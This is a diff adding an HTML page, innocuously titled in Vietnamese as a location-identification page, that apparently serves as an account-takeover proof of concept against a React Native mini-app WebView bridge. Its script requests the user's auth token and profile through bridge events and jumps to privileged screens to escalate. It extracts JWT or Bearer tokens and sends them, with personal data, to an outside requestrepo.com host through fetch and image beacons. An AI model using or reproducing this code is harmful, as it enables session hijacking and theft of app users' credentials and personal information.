@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Định danh địa điểm</title>
+<style>
+body { font-family: sans-serif; margin: 12px; background: #f5f5f5; font-size: 14px; }
+h3 { margin: 4px 0 8px; font-size: 16px; }
+.phase { margin: 6px 0; padding: 8px; background: #fff; border-radius: 6px; border-left: 3px solid #ccc; }
+.phase.done { border-left-color: #34a853; }
+.phase.active { border-left-color: #fbbc04; }
+.phase.fail { border-left-color: #ea4335; }
+button { margin: 4px 4px 4px 0; padding: 8px 12px; font-size: 13px; border: 1px solid #ccc; border-radius: 4px; background: #fff; }
+#token { white-space: pre-wrap; word-break: break-all; font-size: 11px; background: #fff; padding: 8px; border-radius: 4px; max-height: 20vh; overflow: auto; }
+#log { font-size: 11px; color: #333; white-space: pre-wrap; word-break: break-all; max-height: 40vh; overflow: auto; background: #fff; padding: 8px; border-radius: 4px; margin-top: 8px; }
+</style>
+</head>
+<body>
+<h3 id="status">Đang tải...</h3>
+<div id="phase1" class="phase">① MiniApp bridge</div>
+<div id="phase2" class="phase">② NAVIGATE_SCREEN → AppWebviewScreen</div>
+<div id="phase3" class="phase">③ GET_TOKEN / GET_USER_INFO</div>
+<pre id="token"></pre>
+<div id="buttons"></div>
+<div id="log"></div>
+
+<script>
+var EXFIL = 'https://9liv9n84.requestrepo.com';
+var qs = new URLSearchParams(location.search);
+var STAGE = qs.get('stage') || '';
+var logEl = document.getElementById('log');
+var tokenEl = document.getElementById('token');
+var stolen = null;
+var gotToken = false;
+
+function log(msg) {
+  var line = new Date().toISOString().substr(11, 12) + ' ' + msg;
+  logEl.textContent = line + '\n' + logEl.textContent;
+  console.log(msg);
+}
+
+function setPhase(id, cls, text) {
+  var el = document.getElementById(id);
+  el.className = 'phase ' + cls;
+  if (text) el.textContent = text;
+}
+
+function setStatus(t) {
+  document.getElementById('status').textContent = t;
+}
+
+function exfil(tag, data) {
+  var payload = encodeURIComponent(typeof data === 'string' ? data : JSON.stringify(data));
+  try { fetch(EXFIL + '/' + tag + '?d=' + payload, { mode: 'no-cors' }); } catch (_) {}
+  new Image().src = EXFIL + '/' + tag + '?d=' + payload;
+}
+
+function sendEvent(event, data) {
+  log('SEND >> ' + event + ' ' + JSON.stringify(data || {}));
+  try {
+    window.ReactNativeWebView.postMessage(JSON.stringify({ event: event, data: data || {} }));
+    log('SEND OK');
+  } catch (e) {
+    log('SEND ERR: ' + e.message);
+  }
+}
+
+function pullToken(obj, depth) {
+  if (!obj || depth > 4) return null;
+  if (typeof obj === 'string' && obj.length > 20) {
+    if (obj.indexOf('eyJ') === 0 || obj.indexOf('Bearer ') === 0) return obj;
+  }
+  if (typeof obj !== 'object') return null;
+  if (typeof obj.token === 'string' && obj.token.length > 8) return obj.token;
+  if (typeof obj.access_token === 'string') return obj.access_token;
+  if (typeof obj.accessToken === 'string') return obj.accessToken;
+  var keys = ['data', 'user', 'userdata', 'result'];
+  for (var i = 0; i < keys.length; i++) {
+    var t = pullToken(obj[keys[i]], depth + 1);
+    if (t) return t;
+  }
+  return null;
+}
+
+function showToken(tok, src) {
+  gotToken = true;
+  stolen = tok;
+  setPhase('phase3', 'done', '③ TOKEN from ' + src + ' (' + tok.length + ' chars)');
+  setStatus('TOKEN STOLEN');
+  tokenEl.textContent = tok;
+  exfil('v02_token', { src: src, token: tok, href: location.href, stage: STAGE });
+}
+
+function handleResponse(data, via) {
+  if (!data) return;
+  var raw = typeof data === 'string' ? data : JSON.stringify(data);
+  log('RECV ' + via + ': ' + raw.substring(0, 800));
+  exfil('diag_' + via, data);
+
+  var parsed = data;
+  if (typeof data === 'string') {
+    try { parsed = JSON.parse(data); } catch (_) { parsed = { raw: data }; }
+  }
+
+  var ev = parsed.event || parsed.type || '';
+  var tok = pullToken(parsed, 0);
+  if (tok) {
+    showToken(tok, ev || via);
+    return;
+  }
+
+  if (ev === 'ON_GET_USER_INFO' || ev === 'ON_USER_INFO') {
+    setPhase('phase1', 'done', '① GET_USER_INFO ok (no token in MiniApp payload)');
+    exfil('v01_pii', parsed);
+  }
+  if (ev === 'ON_TOKEN') {
+    setPhase('phase3', 'fail', '③ ON_TOKEN with no token field: ' + raw.substring(0, 200));
+  }
+}
+
+window.addEventListener('message', function (e) {
+  handleResponse(e.data, 'message');
+});
+window.addEventListener('nativeMessage', function (e) {
+  handleResponse(e.detail, 'nativeMessage');
+});
+window.handleNativeMessage = function (data) {
+  handleResponse(data, 'handleNativeMessage');
+};
+
+function tokenUrl() {
+  var u = new URL(location.href);
+  u.searchParams.set('stage', 'token');
+  return u.toString();
+}
+
+function navigateToSteal(screenName) {
+  var url = tokenUrl();
+  setPhase('phase2', 'active', '② navigate ' + screenName);
+  log('navigate url=' + url);
+  sendEvent('NAVIGATE_SCREEN', {
+    screen: screenName,
+    name: screenName,
+    replace: true,
+    params: {
+      url: url,
+      title: 'Xác thực',
+      replace: true,
+      screen: { url: url, title: 'Xác thực' }
+    }
+  });
+}
+
+function stealNow() {
+  setPhase('phase3', 'active', '③ GET_TOKEN + GET_USER_INFO');
+  sendEvent('GET_TOKEN', { transId: 'ato-' + Date.now() });
+  setTimeout(function () { sendEvent('GET_USER_INFO', {}); }, 400);
+  setTimeout(function () {
+    if (!gotToken) setPhase('phase3', 'fail', '③ no token after 8s — still MiniApp, or AppWebviewScreen did not reply');
+  }, 8000);
+}
+
+function waitBridge(cb) {
+  if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
+    log('ReactNativeWebView ready stage=' + (STAGE || 'miniapp'));
+    cb();
+    return;
+  }
+  setTimeout(function () { waitBridge(cb); }, 200);
+}
+
+function runMiniApp() {
+  setStatus('MiniApp — jumping to AppWebviewScreen');
+  setPhase('phase1', 'active', '① GET_USER_INFO baseline');
+  sendEvent('GET_USER_INFO', {});
+  sendEvent('GET_TOKEN', { transId: 'probe-miniapp' });
+  setTimeout(function () { navigateToSteal('AppWebviewScreen'); }, 1200);
+}
+
+function runTokenStage() {
+  setStatus('AppWebviewScreen stage — stealing token');
+  setPhase('phase1', 'done', '① skipped (already navigated)');
+  setPhase('phase2', 'done', '② loaded with stage=token');
+  stealNow();
+}
+
+var btnBox = document.getElementById('buttons');
+[
+  { label: 'GET_TOKEN now', fn: function () { sendEvent('GET_TOKEN', { transId: 'manual' }); } },
+  { label: 'GET_USER_INFO', fn: function () { sendEvent('GET_USER_INFO', {}); } },
+  { label: 'Jump AppWebviewScreen', fn: function () { navigateToSteal('AppWebviewScreen'); } },
+  { label: 'Jump HubAirline', fn: function () { navigateToSteal('HubAirline'); } }
+].forEach(function (item) {
+  var b = document.createElement('button');
+  b.textContent = item.label;
+  b.onclick = item.fn;
+  btnBox.appendChild(b);
+});
+
+setTimeout(function () {
+  waitBridge(function () {
+    setPhase('phase1', 'done', '① bridge ready');
+    if (STAGE === 'token') runTokenStage();
+    else runMiniApp();
+  });
+}, 300);
+</script>
+</body>
+</html>
